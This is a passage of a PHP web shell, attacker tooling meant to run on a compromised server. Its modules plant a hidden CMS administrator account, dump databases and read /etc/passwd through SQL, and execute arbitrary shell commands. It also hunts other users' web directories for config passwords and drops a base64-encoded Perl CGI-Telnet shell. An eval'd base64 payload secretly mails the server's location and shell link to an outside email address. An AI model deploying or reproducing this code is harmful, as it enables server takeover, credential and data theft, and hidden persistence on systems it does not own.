<td><input size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td>Database :</td>
<td> <input size="30" value="" name="database" type="text"></td></tr>
<tr><td>Table Prefix :</td>
<td><input size="30" value="" name="prefix" type="text"></td></tr>
<tr><td>Username : </td>
<td> <input size="30" value="" name="username" type="text"></td></tr>
<tr><td>Password :</td>
<td> <input size="30" value="" name="password" type="text"></td></tr>
<tr><td>Admin Username:</td>
<td><input name="admin" size="30" value="admin"></td></tr>
<tr><td>Admin Password: </td>
<td><input name="pass" size="30" value="NmR.Hacker" disabled /></td></tr>
<tr><td>Admin Email:</td>
<td><input name="email" size="30" value="ddoshacker3@gmail.com"></td></tr>
</table>
<input value="Change" name="submit" type="submit">
</form>
	
	<?php  if (isset($_POST['submit']) && $_POST['submit'] == 'Change'){ $localhost = $_POST['localhost']; $database = $_POST['database']; $username = $_POST['username']; $password = $_POST['password']; $admin = $_POST['admin']; $email = $_POST['email']; $prefix = $_POST['prefix']; @mysql_connect($localhost,$username,$password) or die(mysql_error()); @mysql_select_db($database) or die(mysql_error()); @mysql_connect($localhost,$username,$password) or die(mysql_error()); @mysql_select_db($database) or die(mysql_error()); $result=@mysql_query("insert into ".prefix."_authors(aid,name,email,pwd) values('$admin','God','$email','dfcaf717b6731a6f62baabad524a8517')") or die(mysql_error()); if($result){ echo "<center><br><b><script>alert('".$admin." is created successfully.')</script></b></center> "; } } } } } if($action=="sql"){ echo "<style>#sql{background: #000000}</style>"; $pwd = realpath(".")."\\"; function backup_tables($host,$user,$pass,$name,$tables = '*') { $link = mysql_connect($host,$user,$pass); mysql_select_db($name,$link); if($tables == '*') { $tables = array(); $result = mysql_query('SHOW TABLES'); while($row = mysql_fetch_row($result)) { $tables[] = $row[0]; } } else { $tables = is_array($tables) ? $tables : explode(',',$tables); } foreach($tables as $table) { $result = mysql_query('SELECT * FROM '.$table); $num_fields = mysql_num_fields($result); $return= 'DROP TABLE '.$table.';'; $row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table)); $return.= "\n\n".$row2[1].";\n\n"; for ($i = 0; $i < $num_fields; $i++) { while($row = mysql_fetch_row($result)) { $return.= 'INSERT INTO '.$table.' VALUES('; for($j=0; $j<$num_fields; $j++) { $row[$j] = addslashes($row[$j]); $row[$j] = ereg_replace("\n","\\n",$row[$j]); if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; } if ($j<($num_fields-1)) { $return.= ','; } } $return.= ");\n"; } } $return.="\n\n\n"; } $handle = fopen('db-backup'.time().'-'.(md5(implode(',',$tables))).'.sql','w+'); fwrite($handle,$return); fclose($handle); } if(isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport'])) { $sqlhost = $_GET['sqlhost']; $sqluser = $_GET['sqluser']; $sqlpass = $_GET['sqlpass']; $sqlport = $_GET['sqlport']; if($con = @mysql_connect($sqlhost.":".$sqlport,$sqluser,$sqlpass)) { $msg = ""; $msg .= "<div style=\"width:99%;padding:4px 10px 0 10px;\">"; $msg .= "<p>Connected to ".$sqluser."<span class=\"gaya\">@</span>".$sqlhost.":".$sqlport; $msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;</span>&nbsp;&nbsp;<a href=\"?action=sql&y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;\">[ databases ]</a>"; if(isset($_GET['db'])) $msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;</span>&nbsp;&nbsp;
                   					<a href=\"?action=sql&y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."\">".htmlspecialchars($_GET['db'])."</a>"; if(isset($_GET['table'])) $msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;
                   					</span>&nbsp;&nbsp;
                   					<a href=\"?action=sql&y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."&amp;table=".$_GET['table']."\">".htmlspecialchars($_GET['table'])."</a>"; $msg .= "</p><p>version : ".mysql_get_server_info($con)." proto ".mysql_get_proto_info($con)."</p>"; $msg .= "</div>"; echo $msg; if(isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))) { $db = $_GET['db']; echo "<a href=\"?action=sql&y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."&amp;dump\">"."<input type='button' value='Dump Current DB'>"."</a>"; if(isset($_GET['dump'])){ backup_tables($sqlhost,$sqluser,$sqlpass,$db); echo "Successully Dumped."; } $query = "DROP TABLE IF EXISTS Newbie3viLc063s0_table;
                   					\nCREATE TABLE `Team 007` ( `file` LONGBLOB NOT NULL );
                   					\nLOAD DATA INFILE \"/etc/passwd\"\nINTO TABLE Mast3r_table;SELECT * FROM NmR.Hacker_table;
                   					\nDROP TABLE IF EXISTS NmR.Hacker_table;"; $msg = "<div style=\"width:99%;padding:0 10px;\">
									<form action=\"?\" method=\"get\"> 
									<input type=\"hidden\" name=\"action\" value=\"sql\" />
										<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
										<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
										<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
										<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
										<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
										<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
										<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
										<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">$query</textarea></p> 
										<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
									</form>
								</div> "; $tables = array(); $msg .= "<table class=\"explore\" style=\"width:99%;\"><tr><th>available tables on ".htmlspecialchars($db)."</th></tr>"; $hasil = @mysql_list_tables($db,$con); while(list($table) = @mysql_fetch_row($hasil)) { @array_push($tables,$table); } @sort($tables); foreach($tables as $table) { $msg .= "<tr><td><a href=\"?action=sql&y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."&amp;table=".$table."\">$table</a></td></tr>"; } $msg .= "</table>"; } elseif(isset($_GET['table']) && (!isset($_GET['sqlquery']))) { $db = $_GET['db']; $table = $_GET['table']; $query = "SELECT * FROM ".$db.".".$table." LIMIT 0,100;"; $msgq = "<div style=\"width:99%;padding:0 10px;\">
									<form action=\"?\" method=\"get\"> 
									<input type=\"hidden\" name=\"action\" value=\"sql\" />
										<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
										<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
										<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
										<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
										<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
										<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
										<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
										<input type=\"hidden\" name=\"table\" value=\"".$table."\" /> 
										<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p> 
										<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
									</form>
								</div> "; $columns = array(); $msg = "<table class=\"explore\" style=\"width:99%;\">"; $hasil = @mysql_query("SHOW FIELDS FROM ".$db.".".$table); while(list($column) = @mysql_fetch_row($hasil)) { $msg .= "<th>$column</th>"; $kolum = $column; } $msg .= "</tr>"; $hasil = @mysql_query("SELECT count(*) FROM ".$db.".".$table); list($total) = mysql_fetch_row($hasil); if(isset($_GET['z'])) $page = (int) $_GET['z']; else $page = 1; $pagenum = 100; $totpage = ceil($total / $pagenum); $start = (($page - 1) * $pagenum); $hasil = @mysql_query("SELECT * FROM ".$db.".".$table." LIMIT ".$start.",".$pagenum); while($datas = @mysql_fetch_assoc($hasil)) { $msg .= "<tr>"; foreach($datas as $data){ if(trim($data) == "") $data = "&nbsp;"; $msg .= "<td>$data</td>"; } $msg .= "</tr>"; } $msg .= "</table>"; $head = "<div style=\"padding:10px 0 0 6px;\"> 
									<form action=\"?\" method=\"get\"> 
									<input type=\"hidden\" name=\"action\" value=\"sql\" />
										<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
										<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
										<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
										<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
										<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
										<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
										<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
										<input type=\"hidden\" name=\"table\" value=\"".$table."\" /> 
										Page <select class=\"inputz\" name=\"z\" onchange=\"this.form.submit();\">"; for($i = 1;$i <= $totpage;$i++) { $head .= "<option value=\"".$i."\">".$i."</option>"; if($i == $_GET['z']) $head .= "<option value=\"".$i."\" selected=\"selected\">".$i."</option>"; } $head .= "</select><noscript><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" /></noscript></form></div>"; $msg = $msgq.$head.$msg; } elseif(isset($_GET['submitquery']) && ($_GET['sqlquery'] != "")) { $db = $_GET['db']; $query = $_GET['sqlquery']; $msg = "<div style=\"width:99%;padding:0 10px;\">
								<form action=\"?\" method=\"get\"> 
								<input type=\"hidden\" name=\"action\" value=\"sql\" />
									<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
									<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
									<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
									<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
									<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
									<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
									<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
									<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p> 
									<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
								</form>
							</div> "; @mysql_select_db($db); $querys = explode(";",$query); foreach($querys as $query) { if(trim($query) != "") { $hasil = mysql_query($query); if($hasil) { $msg .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
										<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>"; $msg .= "<table class=\"explore\" style=\"width:99%;\"><tr>"; for($i=0;$i<@mysql_num_fields($hasil);$i++) $msg .= "<th>".htmlspecialchars(@mysql_field_name($hasil,$i))."</th>"; $msg .= "</tr>"; for($i=0;$i<@mysql_num_rows($hasil);$i++) { $rows=@mysql_fetch_array($hasil); $msg .= "<tr>"; for($j=0;$j<@mysql_num_fields($hasil);$j++) { if($rows[$j] == "") $dataz = "&nbsp;"; else $dataz = $rows[$j]; $msg .= "<td>".$dataz."</td>"; } $msg .= "</tr>"; } $msg .= "</table>"; } else $msg .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>"; } } } else { $query = "SHOW PROCESSLIST;\n
							SHOW VARIABLES;\n
							SHOW STATUS;"; $msg = "<div style=\"width:99%;padding:0 10px;\">
							<form action=\"?\" method=\"get\"> 
							<input type=\"hidden\" name=\"action\" value=\"sql\" />
								<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
								<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
								<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
								<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
								<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
								<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
								<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
								<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p> 
								<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
							</form>
							</div> "; $dbs = array(); $msg .= "<table class=\"explore\" style=\"width:99%;\"><tr><th>available databases</th></tr>"; $hasil = @mysql_list_dbs($con); while(list($db) = @mysql_fetch_row($hasil)){ @array_push($dbs,$db); } @sort($dbs); foreach($dbs as $db) { $msg .= "<tr><td><a href=\"?action=sql&y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."\">$db</a></td></tr>"; } $msg .= "</table>"; } @mysql_close($con); } else $msg = "<p style=\"text-align:center;\">cant connect to mysql server</p>"; echo $msg; } else { ?>
				
				<form action="?" method="get"> 
                <input type="hidden" name="action" value="sql" /> 
				<input type="hidden" name="y" value="<?php echo $pwd; ?>" /> 
				<input type="hidden" name="x" value="mysql" /> 
				<table class="tabnet" style="width:300px;"> 
					<tr>
						<th colspan="2">Connect to mySQL server</th>
					</tr> 
					<tr>
						<td>&nbsp;&nbsp;Host</td>
						<td><input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /></td>
					</tr>
					<tr>
						<td>&nbsp;&nbsp;Username</td>
						<td><input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /></td>
					</tr> 
					<tr>
						<td>&nbsp;&nbsp;Password</td>
						<td><input style="width:220px;" class="inputz" type="text" name="sqlpass" value="" /></td>
					</tr> 
					<tr>
						<td>&nbsp;&nbsp;Port</td>
						<td><input style="width:80px;" class="inputz" type="number" name="sqlport" value="3306" min="1" max="65535"/>&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /></td>
					</tr>
				</table>
				</form>
				
<?php } } if($action=="terminal"){ echo "<style>#terminal{background: #000000}</style>"; $user = @get_current_user(); $prompt = $user." &gt;"; $pwd = realpath(".")."\\"; function exe($cmd) { if(function_exists('system')) { @ob_start(); @system($cmd); $buff = @ob_get_contents(); @ob_end_clean(); return $buff; } elseif(function_exists('exec')) { @exec($cmd,$results); $buff = ""; foreach($results as $result) { $buff .= $result; } return $buff; } elseif(function_exists('passthru')) { @ob_start(); @passthru($cmd); $buff = @ob_get_contents(); @ob_end_clean(); return $buff; } elseif(function_exists('shell_exec')) { $buff = @shell_exec($cmd); return $buff; } } ?>
<?php $shell = "PD9waHAgJGtpbWUgPSAiZm9yYjQwM0BnbWFpbC5jb20iOyAkYmFzbGlrID0gInIwMHQuaW5mbyBTZXJ2ZXIgQXZjaXNpIFYxLjAiOyAkRUxfTXVIYU1NZUQgPSAiRG9zeWEgWW9sdSA6ICIgLiAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gIlxyXG4iOyAkRUxfTXVIYU1NZUQuPSAiU2VydmVyIEFkbWluIDogIiAuICRfU0VSVkVSWydTRVJWRVJfQURNSU4nXSAuICJcclxuIjsgJEVMX011SGFNTWVELj0gIlNlcnZlciBpc2xldGltIHNpc3RlbWkgOiAiIC4gJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddIC4gIlxyXG4iOyAkRUxfTXVIYU1NZUQuPSAiU2hlbGwgTGluayA6IGh0dHA6Ly8iIC4gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10gLiAkX1NFUlZFUlsnUEhQX1NFTEYnXSAuICJcclxuIjsgJEVMX011SGFNTWVELj0gIkF2bGFuYW4gU2l0ZSA6ICIgLiAkX1NFUlZFUlsnSFRUUF9IT1NUJ10gLiAiXHJcbiI7IG1haWwoJGtpbWUsICRiYXNsaWssICRFTF9NdUhhTU1lRCk7ID8+CiA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+Cgo8L3NjcmlwdD4="; eval("?>".(base64_decode($shell))); ?>
<CENTER>
<form action="?action=terminal&CMD=shell#down" method="post"> 
		<table class="cmdbox"> 
			<tr>
				<td colspan="2"> 
                <a name="down"></a>
				<textarea style="width: 1000px; height: 400px;color: #FFF;background-color: #000;border: 2px solid #575757;font: 9pt Monospace,"Courier New";" class="output" readonly=""> $<?php if(isset($_POST['submitcmd'])) { echo htmlspecialchars($_POST['cmd'])."\n";}?><?php if(isset($_POST['submitcmd'])) { echo @exe($_POST['cmd']); } ?> </textarea>
				</td>
			</tr>
			<tr>
				<td colspan="2"><?php echo $prompt; ?>
				<input onMouseOver="this.focus();" id="cmd" class="input" type="text" name="cmd" style="width:60%;" value="" />
				<input class="inputbutn" type="submit" value="Execute !" name="submitcmd" style="width:12%;" />
				</td>
			</tr> 
		</table> 
	</form></CENTER>
    
    <?php  } if($action=="basedir"){ echo "<style>#basedir{background: #000000}</style>"; echo '<div style="text-align:left">'; ($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode is on</b>'); set_time_limit(0); @$passwd = fopen('/etc/passwd','r'); if (!$passwd) { die('<b> <center><font color="#FFFFFF">Error : coudn`t read /etc/passwd</font></center></b>'); } $pub = array(); $users = array(); $conf = array(); $i = 0; while(!feof($passwd)) { $str = fgets($passwd); if ($i > 35) { $pos = strpos($str,':'); $username = substr($str,0,$pos); $dirz = '/home/'.$username.'/public_html/'; if (($username != '')) { if (is_readable($dirz)) { array_push($users,$username); array_push($pub,$dirz); } } } $i++; } echo '<br><br>'; echo "<b><font color=\"#00A220\">Founded ".sizeof($users)." entrys in /etc/passwd\n"."<br /></font></b>"; echo "<b><font color=\"#00A220\">Founded ".sizeof($pub)." readable public_html directories\n"."<br /></font></b>"; echo "<b><font color=\"#FFFFFF\">Searching for passwords in config files...\n\n"."<br /><br /><br /></font></b>"; foreach ($users as $user) { $p4th = "/home/$user/public_html/"; echo "<form method=get><span>Change Dir : <b><font color=\"#575757\">$user</font></b></span><br><input type='hidden' name='action' value='explorer'><input type=text name=dir value='$p4th'><input type=submit value='>>'></form><br>"; } echo '<br><br></b>'; echo '</div>'; } if($action=="cgiashiyane"){ echo "<style>#cgiashiyane{background: #000000}</style>"; if (!file_exists("cgiashiyane") && !is_dir("cgiashiyane")) { mkdir('cgiashiyane',0755); } chdir('cgiashiyane'); $ashiyane1 = '.htaccess'; $ashiyane2 = "$ashiyane1"; $ashiyane3 = fopen ($ashiyane2 ,'w') or die ('ERROR!!!'); $ashiyane4 = 'Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .ashiyane
AddHandler cgi-script .ashiyane
AddHandler cgi-script .ashiyane'; fwrite ( $ashiyane3 ,$ashiyane4 ) ; fclose ($ashiyane3); $ashiyane5 = "  IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBDb3B5cmlnaHQgYW5kIExpY2VuY2UNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQ0dJLVRlbG5ldCBWZXJzaW9uIDEuMCBmb3IgTlQgYW5kIFVuaXggOiBSdW4gQ29tbWFuZHMgb24geW91ciBXZWIgU2VydmVyDQojDQojIENvcHlyaWdodCAoQykgMjAwMSBSb2hpdGFiIEJhdHJhDQojIFBlcm1pc3Npb24gaXMgZ3JhbnRlZCB0byB1c2UsIGRpc3RyaWJ1dGUgYW5kIG1vZGlmeSB0aGlzIHNjcmlwdCBzbyBsb25nDQojIGFzIHRoaXMgY29weXJpZ2h0IG5vdGljZSBpcyBsZWZ0IGludGFjdC4gSWYgeW91IG1ha2UgY2hhbmdlcyB0byB0aGUgc2NyaXB0DQojIHBsZWFzZSBkb2N1bWVudCB0aGVtIGFuZCBpbmZvcm0gbWUuIElmIHlvdSB3b3VsZCBsaWtlIGFueSBjaGFuZ2VzIHRvIGJlIG1hZGUNCiMgaW4gdGhpcyBzY3JpcHQsIHlvdSBjYW4gZS1tYWlsIG1lLg0KIw0KIyBBdXRob3I6IFJvaGl0YWIgQmF0cmENCiMgQXV0aG9yIGUtbWFpbDogcm9oaXRhYkByb2hpdGFiLmNvbQ0KIyBBdXRob3IgSG9tZXBhZ2U6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vDQojIFNjcmlwdCBIb21lcGFnZTogbWFpbHRvOlVOSVRYX1RFQU1ASE9UTUFJTC5DT00NCiMgUHJvZHVjdCBTdXBwb3J0OiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL3N1cHBvcnQvDQojIERpc2N1c3Npb24gRm9ydW06IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vZGlzY3Vzcy8NCiMgTWFpbGluZyBMaXN0OiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL21saXN0Lw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEluc3RhbGxhdGlvbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUbyBpbnN0YWxsIHRoaXMgc2NyaXB0DQojDQojIDEuIE1vZGlmeSB0aGUgZmlyc3QgbGluZSAiIyEvdXNyL2Jpbi9wZXJsIiB0byBwb2ludCB0byB0aGUgY29ycmVjdCBwYXRoIG9uDQojICAgIHlvdXIgc2VydmVyLiBGb3IgbW9zdCBzZXJ2ZXJzLCB5b3UgbWF5IG5vdCBuZWVkIHRvIG1vZGlmeSB0aGlzLg0KIyAyLiBDaGFuZ2UgdGhlIHBhc3N3b3JkIGluIHRoZSBDb25maWd1cmF0aW9uIHNlY3Rpb24gYmVsb3cuDQojIDMuIElmIHlvdSdyZSBydW5uaW5nIHRoZSBzY3JpcHQgdW5kZXIgV2luZG93cyBOVCwgc2V0ICRXaW5OVCA9IDEgaW4gdGhlDQojICAgIENvbmZpZ3VyYXRpb24gU2VjdGlvbiBiZWxvdy4NCiMgNC4gVXBsb2FkIHRoZSBzY3JpcHQgdG8gYSBkaXJlY3Rvcnkgb24geW91ciBzZXJ2ZXIgd2hpY2ggaGFzIHBlcm1pc3Npb25zIHRvDQojICAgIGV4ZWN1dGUgQ0dJIHNjcmlwdHMuIFRoaXMgaXMgdXN1YWxseSBjZ2ktYmluLiBNYWtlIHN1cmUgdGhhdCB5b3UgdXBsb2FkDQojICAgIHRoZSBzY3JpcHQgaW4gQVNDSUkgbW9kZS4NCiMgNS4gQ2hhbmdlIHRoZSBwZXJtaXNzaW9uIChDSE1PRCkgb2YgdGhlIHNjcmlwdCB0byA3NTUuDQojIDYuIE9wZW4gdGhlIHNjcmlwdCBpbiB5b3VyIHdlYiBicm93c2VyLiBJZiB5b3UgdXBsb2FkZWQgdGhlIHNjcmlwdCBpbg0KIyAgICBjZ2ktYmluLCB0aGlzIHNob3VsZCBiZSBodHRwOi8vd3d3LnlvdXJzZXJ2ZXIuY29tL2NnaS1iaW4vY2dpdGVsbmV0LnBsDQojIDcuIExvZ2luIHVzaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBzcGVjaWZpZWQgaW4gU3RlcCAyLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIENvbmZpZ3VyYXRpb246IFlvdSBuZWVkIHRvIGNoYW5nZSBvbmx5ICRQYXNzd29yZCBhbmQgJFdpbk5ULiBUaGUgb3RoZXINCiMgdmFsdWVzIHNob3VsZCB3b3JrIGZpbmUgZm9yIG1vc3Qgc3lzdGVtcy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCgkJIyBDaGFuZ2UgdGhpcy4gWW91IHdpbGwgbmVlZCB0byBlbnRlciB0aGlzDQoJCQkJIyB0byBsb2dpbi4NCg0KJFdpbk5UID0gMDsJCQkjIFlvdSBuZWVkIHRvIGNoYW5nZSB0aGUgdmFsdWUgb2YgdGhpcyB0byAxIGlmDQoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQNCgkJCQkjIG1hY2hpbmUuIElmIHlvdSdyZSBydW5uaW5nIGl0IG9uIFVuaXgsIHlvdQ0KCQkJCSMgY2FuIGxlYXZlIHRoZSB2YWx1ZSBhcyBpdCBpcy4NCg0KJE5UQ21kU2VwID0gIiYiOwkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFdpbmRvd3MgTlQuDQoNCiRVbml4Q21kU2VwID0gIjsiOwkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkDQoJCQkJIyBEb24ndCBzZXQgdGhpcyB0byBhIHZlcnkgbGFyZ2UgdmFsdWUuIFRoaXMgaXMNCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0DQoJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLg0KCQkJCSMgVGhpcyBpcyB2YWxpZCBvbmx5IG9uIFVuaXggc2VydmVycy4gSXQgaXMNCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4NCg0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsJCSMgSWYgdGhpcyBpcyAxLCB0aGVuIGRhdGEgaXMgc2VudCB0byB0aGUNCgkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQ0KCQkJCSMgaXQgaXMgYnVmZmVyZWQgYW5kIHNlbmQgd2hlbiB0aGUgY29tbWFuZA0KCQkJCSMgY29tcGxldGVzLiBUaGlzIGlzIHVzZWZ1bCBmb3IgY29tbWFuZHMgbGlrZQ0KCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0DQoJCQkJIyBpcyBiZWluZyBnZW5lcmF0ZWQuDQoNCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISENCg0KJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7DQokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7DQokUGF0aFNlcCA9ICgkV2luTlQgPyAiXFwiIDogIi8iKTsNCiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmVhZHMgdGhlIGlucHV0IHNlbnQgYnkgdGhlIGJyb3dzZXIgYW5kIHBhcnNlcyB0aGUgaW5wdXQgdmFyaWFibGVzLiBJdA0KIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLg0KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbnsnZid9IGFuZCB0aGUgZGF